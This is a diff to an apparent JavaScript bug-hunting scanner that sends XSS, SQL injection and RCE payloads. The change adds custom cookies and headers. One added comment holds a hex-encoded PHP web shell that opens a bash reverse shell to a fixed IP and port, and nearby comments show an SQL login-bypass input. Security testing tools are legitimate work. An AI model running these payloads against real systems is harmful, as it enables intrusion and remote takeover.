@@ -21,6 +21,8 @@ function JsBugHuntingHelper () {
   this.originalWinObj = {}
   this.attackerIp = ''
   this.attackerPort = ''
+  this.customCookie = ''
+  this.customHeaders = ''
 
   const previousXssAction = 'null'
   const genericXssResult = "data.indexOf('alert(\"XSS_VULNERABLE_PARAM\")') !== -1"
@@ -77,6 +79,10 @@ function JsBugHuntingHelper () {
       // $username = admin'/*
       // $password = '*/ --
       // then you'll have SELECT * FROM `users` WHERE username ='Admin'/* and password=''*/
+
+      // method to create shell from mysql
+      // win
+      // 0x3c3f706870206578656328222f62696e2f62617368202d63202762617368202d69203e26202f6465762f7463702f3139322e3136382e3133372e312f3232323220303e26312722293b3f3e
 
       for (let fq = 0; fq < sqliQuery[q].finalQuote.length; fq++) {
         const payloadWithQuotes = payload + sqliQuery[q].finalQuote[fq]
@@ -181,7 +187,7 @@ function JsBugHuntingHelper () {
   // eslint-disable-next-line no-multiple-empty-lines
   // eslint-disable-next-line no-unused-vars
   // @return void
-  this.init = async function (xssScanEnabled, sqlInjectionScanEnabled, rceScanEnabled, formFuzzingEnabled, attackerIp, attackerPort) {
+  this.init = async function (xssScanEnabled, sqlInjectionScanEnabled, rceScanEnabled, formFuzzingEnabled, attackerIp, attackerPort, customCookie, customHeaders) {
     document.getElementById('openGuiButton').disabled = true
     document.getElementById('openGuiButton').innerHTML = 'Loading...'
 
@@ -191,6 +197,19 @@ function JsBugHuntingHelper () {
     this.formFuzzingEnabled = formFuzzingEnabled
     this.attackerIp = attackerIp
     this.attackerPort = attackerPort
+    this.customHeaders = '{}'
+
+    try {
+      if (customHeaders.trim() !== '') {
+        this.customHeaders = JSON.stringify(JSON.parse(customHeaders))
+      }
+    } catch (e) {
+      alert(e)
+    }
+
+    if (customCookie.trim() !== '') {
+      document.cookie = customCookie
+    }
 
     // console.log(window.wrappedJSObject)
 
@@ -353,7 +372,7 @@ function JsBugHuntingHelper () {
     if (this.xssScanEnabled === true) {
       console.log('URL XSS Vulnerabilities'.toUpperCase())
 
-      const xss = await testXSS()
+      const xss = await testXSS.call(this)
       console.log(xss)
 
       accordionNumber++
@@ -382,7 +401,7 @@ function JsBugHuntingHelper () {
     if (this.sqlInjectionScanEnabled === true) {
       console.log('URL SQL Injection Vulnerabilities'.toUpperCase())
 
-      const sql = await testSqlInjection()
+      const sql = await testSqlInjection.call(this)
       console.log(sql)
 
       accordionNumber++
@@ -813,7 +832,8 @@ function JsBugHuntingHelper () {
           payload.payloadString,
           // eslint-disable-next-line no-useless-escape
           payload.expectedResult,
-          'XSS'
+          'XSS',
+          this.customHeaders
         ).isValidResponse()
         if (r !== false) {
           result.push(r)
@@ -840,7 +860,8 @@ function JsBugHuntingHelper () {
           payload.payloadString,
           // eslint-disable-next-line no-useless-escape
           payload.expectedResult,
-          'SQL Injection'
+          'SQL Injection',
+          this.customHeaders
         ).isValidResponse()
         if (r !== false) {
           result.push(r)
@@ -867,7 +888,8 @@ function JsBugHuntingHelper () {
           payload.payloadString.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort),
           // eslint-disable-next-line no-useless-escape
           payload.expectedResult,
-          'RCE'
+          'RCE',
+          this.customHeaders
         ).isValidResponse()
         if (r !== false) {
           result.push(r)
@@ -952,7 +974,8 @@ function JsBugHuntingHelper () {
             payload.payloadString,
             // eslint-disable-next-line no-useless-escape
             payload.expectedResult,
-            'XSS'
+            'XSS',
+            this.customHeaders
           ).isValidResponse()
           if (r !== false) {
             result.push(r)
@@ -972,7 +995,8 @@ function JsBugHuntingHelper () {
             payload.payloadString.replace('[ATTACKERIP]', this.attackerIp),
             // eslint-disable-next-line no-useless-escape
             payload.expectedResult,
-            'SQL Injection'
+            'SQL Injection',
+            this.customHeaders
           ).isValidResponse()
           if (r !== false) {
             result.push(r)
@@ -992,7 +1016,8 @@ function JsBugHuntingHelper () {
             payload.payloadString.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort),
             // eslint-disable-next-line no-useless-escape
             payload.expectedResult,
-            'RCE'
+            'RCE',
+            this.customHeaders
           ).isValidResponse()
           if (r !== false) {
             result.push(r)
